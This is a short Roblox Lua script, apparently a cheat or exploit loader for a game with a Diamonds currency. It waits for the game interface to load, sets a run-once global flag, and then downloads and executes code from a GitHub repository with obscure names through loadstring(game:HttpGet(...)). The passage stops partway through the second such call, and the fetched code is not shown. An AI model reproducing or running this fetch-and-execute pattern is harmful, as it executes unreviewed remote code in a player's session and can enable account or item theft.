repeat task.wait() until game:IsLoaded()
local LocalPlayer = game:GetService('Players').LocalPlayer
repeat task.wait() until not LocalPlayer.PlayerGui:FindFirstChild('__INTRO')

repeat
    wait(2)
until game:IsLoaded() and
    game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui") and
    game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("MainLeft") and
    game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Visible == true and
    not game:GetService("Players").LocalPlayer:FindFirstChild("GUIFX Holder")

if _G.TAG then
    return 
end
_G.TAG = true

task.spawn(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/bwixauxnn3366265894447/xcvd4ccss566532/refs/heads/main/Faa_combooodia"))()
end)

task.spawn(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/bwixauxnn3366265894447/xcvd4ccss566532/refs/heads/main/xx112512252"))()
